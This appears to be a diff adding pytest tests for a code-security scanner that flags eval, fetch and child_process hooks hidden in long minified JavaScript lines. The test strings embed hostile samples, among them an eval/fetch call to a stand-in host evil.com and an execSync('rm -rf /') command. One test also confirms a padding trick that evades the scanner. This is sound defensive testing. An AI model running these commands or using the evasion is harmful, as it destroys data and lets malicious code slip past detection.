@@ -252,3 +252,121 @@ def test_comprehensive_risk_evaluation_coverage(lens):
     ):
         result_crash = lens.scan_binary(b"\x00" * 300, ".bin")
         assert result_crash == {}
+
+# 4. Binary Scanner Exception Handler
+    # We pass a valid byte array to survive the header scan, but mock the Counter
+    # to throw an exception, proving the except block safely swallows it.
+    with patch(
+        "gitgalaxy.security.security_lens.Counter",
+        side_effect=ValueError("Simulated math crash"),
+    ):
+        result_crash = lens.scan_binary(b"\x00" * 300, ".bin")
+        assert result_crash == {}
+
+
+# ==============================================================================
+# TEST 8: MINIFICATION & OBFUSCATION FALLBACK SCREEN (DEEP VALIDATION)
+# ==============================================================================
+
+def test_minified_fallback_standard_webpack_chunk(lens):
+    """
+    [HAPPY PATH] Proves the fallback screen detects multiple disparate execution 
+    and I/O hooks inside a massive, unbroken 50,000-character line.
+    """
+    padding = "A" * 50000
+    payload = f"var config='{padding}'; eval(atob(payload)); fetch('http://evil.com');"
+    
+    result = lens.scan_content(payload, loc=1)
+    counts = result["counts"]
+    snippets = result["snippets"]
+
+    assert counts.get("high_risk_execution", 0) > 0, "Failed to catch 'eval(' in 50k char line."
+    assert counts.get("io", 0) > 0, "Failed to catch 'fetch(' in 50k char line."
+    assert any("[Minified Literal Hit]" in s for s in snippets.get("high_risk_execution", []))
+
+
+def test_minified_fallback_substring_safety_trap(lens):
+    """
+    [UNHAPPY PATH] Proves the literal string matcher does not hallucinate on 
+    safe substrings that mimic malicious hooks (e.g., 'evaluation' vs 'eval').
+    """
+    padding = "B" * 15000
+    # Uses "evaluation(" and "prefetch(" to try and trick the literal search
+    payload = f"const data = '{padding}'; function evaluation(x) {{ return true; }} prefetch(data);"
+    
+    result = lens.scan_content(payload, loc=1)
+    counts = result["counts"]
+
+    assert counts.get("high_risk_execution", 0) == 0, "Hallucinated 'eval(' on 'evaluation('!"
+    assert counts.get("io", 0) == 0, "Hallucinated 'fetch(' on 'prefetch('!"
+
+
+def test_minified_fallback_buried_node_stealer(lens):
+    """
+    [EXTREME BOUNDARY] Proves the $O(N)$ string search can locate a threat 
+    buried at the absolute tail end of a 100KB buffer without timing out.
+    """
+    padding = "x" * 100000
+    payload = f"module.exports = function() {{ var junk = '{padding}'; require('child_process').execSync('rm -rf /'); }};"
+    
+    result = lens.scan_content(payload, loc=1)
+    counts = result["counts"]
+    snippets = result["snippets"]
+
+    assert counts.get("high_risk_execution", 0) > 0, "Failed to catch 'child_process' at 100KB depth!"
+    assert "[Minified Literal Hit]: child_process" in str(snippets.get("high_risk_execution", []))
+
+
+def test_minified_fallback_mass_threshold_evasion(lens):
+    """
+    [ADVERSARIAL TRAP] Proves the mathematical boundary of the 10% mass threshold.
+    An attacker attempts to evade the fallback screen by padding the file with 
+    just enough "safe" short lines to keep the safe_content > 10% of total mass, 
+    while hiding the payload on a 300-character line that the regular regex drops.
+    """
+    # 15 safe lines, 11 chars each = 165 characters of "safe" content
+    safe_lines = "let a = 1;\n" * 15 
+    
+    # 1 malicious line of ~320 characters
+    malicious_long_line = "var b = '" + ("C" * 300) + "'; eval(b);\n" 
+    
+    payload = safe_lines + malicious_long_line
+    
+    # Total length = ~485. Safe length = 165.
+    # 165 / 485 = ~34% safe content. 
+    # Because 34% > 10%, the fallback screen mathematically WILL NOT run.
+    # The standard regex WILL drop the 320-char line due to the < 250 ReDoS armor.
+    
+    result = lens.scan_content(payload, loc=16)
+    counts = result["counts"]
+
+    # This assertion CONFIRMS the evasion works, establishing the known physical 
+    # limits of the 10% threshold design. 
+    assert counts.get("high_risk_execution", 0) == 0, (
+        "Threshold evasion failed! The fallback screen ran when it mathematically shouldn't have."
+    )
+
+
+def test_minified_fallback_near_miss_threshold(lens):
+    """
+    [PRECISION CHECK] Proves the fallback screen properly engages when the safe mass 
+    is exactly at the 9% mark (just under the 10% threshold).
+    """
+    # 3 safe lines = ~33 characters
+    safe_lines = "let a = 1;\n" * 3
+    
+    # 1 malicious line of ~400 characters
+    malicious_long_line = "var b = '" + ("D" * 380) + "'; setTimeout(b, 1000);\n"
+    
+    payload = safe_lines + malicious_long_line
+    
+    # Total length = ~433. Safe length = 33.
+    # 33 / 433 = ~7.6% safe content.
+    # Because 7.6% < 10%, the fallback screen MUST engage.
+    
+    result = lens.scan_content(payload, loc=4)
+    counts = result["counts"]
+
+    assert counts.get("high_risk_execution", 0) > 0, (
+        "Fallback screen failed to engage at the 7.6% mass threshold!"
+    )
